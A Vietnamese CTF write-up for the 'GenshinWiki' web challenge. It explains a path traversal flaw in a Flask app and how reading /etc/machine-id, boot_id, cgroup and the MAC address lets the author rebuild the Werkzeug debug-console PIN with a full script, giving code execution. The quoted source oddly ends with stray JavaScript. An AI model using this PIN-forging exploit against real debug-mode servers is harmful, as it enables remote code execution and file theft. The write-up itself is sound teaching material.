# HCMUS_CTF - Quals
<hr />
  
## `GenshinWiki`   
  
```  
Description: Flag stored at ./flag.txt  
Attachment: Dockerfile  
```  
  
Challenge này cho một file `Dockerfile` có nội dung như sau  
```
FROM ubuntu:16.04

RUN apt-get update -y && \
    apt-get install -y python-pip python-dev

COPY ./requirements.txt /app/requirements.txt

WORKDIR /app

RUN pip install -r requirements.txt

COPY . /app

EXPOSE 3000

CMD ["python", "app.py"]
```  

Tổng quan về challenge thì web dính lỗi `Path traversal`, từ chổ này ta có thể đọc bất kỳ file nào trên server. Đồng thời, lợi dụng lỗi này ta có thể dễ dàng lấy source ở `/app/app.py`  
  
Source code:  
```python  
import glob
import json
from flask import Flask, render_template, request

app = Flask(__name__)

with open("flag.txt", "r") as f:
    flag = f.read()


@app.route("/")
def index():
    file_list = glob.glob("characters/*")
    file_list.sort()
    character_list = []
    for file in file_list:
        with open(file, "r") as f:
            character = json.loads(f.read())
        character_list.append(character)
    return render_template("index.html", character_list=character_list)


@app.route("/character")
def character():
    slug = request.args.get("name")
    with open("characters/" + slug, "r") as f:
        data = f.read()
    if flag in data:
        return "No flag for you! Checkmate!"
    return render_template("character.html", data=data)

if __name__ == "__main__":
    app.run("0.0.0.0", 3000, debug=True);
    document.title = `${character.name} | Genshin Impact - Wikipedia`;
    document.querySelector("#img").src = character.img;
    document.querySelector("#name").innerText = character.name;
    document.querySelector("#title").innerText = character.title;
    document.querySelector("#intro").innerText = character.intro;
    document.querySelector("#personality").innerText = character.personality;  
```
Dễ dàng thấy lỗi `Path traversal` ở route `/character`  
```python
@app.route("/character")
def character():
    slug = request.args.get("name")
    with open("characters/" + slug, "r") as f:
        data = f.read()
    if flag in data: # Vì bị check chổ này nên ta không thể đọc được flag một cách dễ dàng được :((
        return "No flag for you! Checkmate!"
    return render_template("character.html", data=data)
```  
Vì options `debug=True` được mở, nên có thể dễ dàng check được rằng là route `/console` đang được bật, nhưng cần phải có `PIN code`. Giờ việc cần làm là gen lại được cái `PIN code` đấy để có thể đọc flag.  
  
Code gen pin:
```python
import hashlib 
from itertools import chain
import os
import getpass

pin = None
rv = None
num = None

probably_public_bits = [ 
  'root' , # Vì deloy bằng docker nên ta có thể đoán được, hoặc đọc file /etc/passwd và có thể confirm rằng ta có thể đọc /etc/shadow qua Path traversal 
  'flask.app' , # modname Always the same 
  'Flask' , # Always the same
  '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None) => Cái này các bạn tự deloy rồi kiểm tra nhé  
]
# PIN = 336-514-623  

def _generate():
    linux = b""
    for filename in "./machine-id.txt", "./boot_id.txt": # machine-id.txt từ /etc/machine-id (có thể có hoặc không) và bood_id lấy từ /proc/sys/kernel/random/boot_id
        try:
            with open(filename, "rb") as f:
                value = f.readline().strip()
        except IOError:
            continue

        if value:
            linux += value
            break
    try:
        with open("./cgroup.txt", "rb") as f: # file cgroup.txt lấy từ /proc/self/cgroup
            linux += f.readline().strip().rpartition(b"/")[2]
    except IOError:
        pass

    if linux:
        print(linux)
        return(linux)
private_bits = [
  "6715920611201", # Đây là MAC address được convert sang decimal, đầu tiên đọc /proc/net/arp để tìm network interface (case này là eth0) và sau đó, đọc /sys/class/net/eth0/address để lấy địa chỉ MAC rồi convert sang decimal là xong
  _generate()
 ]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)

h.update(b"cookiesalt")

cookie_name = "__wzd" + h.hexdigest()[:20]

if num is None:
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
        else:
            rv = num
print(rv)
```  
Sau khi có `PIN code` thì nhập vào và chiếm được console rồi đọc flag!!
> FLAG: `HCMUS-CTF{turn-off-debug-mode-pls}`  
    


## `CuteShopV2`   
## `regex`   
## `Pokegen` 
